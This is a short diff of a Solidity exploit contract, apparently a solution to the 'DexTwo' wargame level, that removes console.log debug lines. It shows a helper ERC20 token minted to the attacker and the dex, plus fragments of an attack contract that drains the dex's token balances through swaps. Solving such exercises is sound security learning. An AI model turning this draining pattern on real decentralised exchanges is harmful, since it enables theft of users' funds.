@@ -3,14 +3,11 @@ pragma solidity ^0.8.0;
 
 import {DexTwo, SwappableTokenTwo} from "../levels/DexTwo.sol";
 import {ERC20} from "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
-import {console} from "forge-std/console.sol";
 
 contract OtherToken is ERC20 {
     constructor(address dexAddress, uint256 tokenAmount, uint256 tokenSupply) ERC20("Other Token", "OTK") {
 	_mint(msg.sender, ((2 ** tokenAmount) * tokenSupply) - tokenSupply);
 	_mint(dexAddress, tokenSupply);
-	console.log(tokenSupply);
-	console.log(((2 ** tokenAmount) * tokenSupply) - tokenSupply);
     }
 }
 
@@ -41,7 +38,6 @@ contract DexTwoAttack {
 		token2Balance = token2.balanceOf(levelAddress);
 		token3Balance = token3.balanceOf(levelAddress);
 		totalBalance = token1Balance + token2Balance;
-		console.log(totalBalance);
 	    }
 	    if (token2Balance > 0) {
 		instance.approve(levelAddress, token3Balance);
@@ -50,7 +46,6 @@ contract DexTwoAttack {
 		token2Balance = token2.balanceOf(levelAddress);
 		token3Balance = token3.balanceOf(levelAddress);
 		totalBalance = token1Balance + token2Balance;
-		console.log(totalBalance);
 	    }
 	}
     }
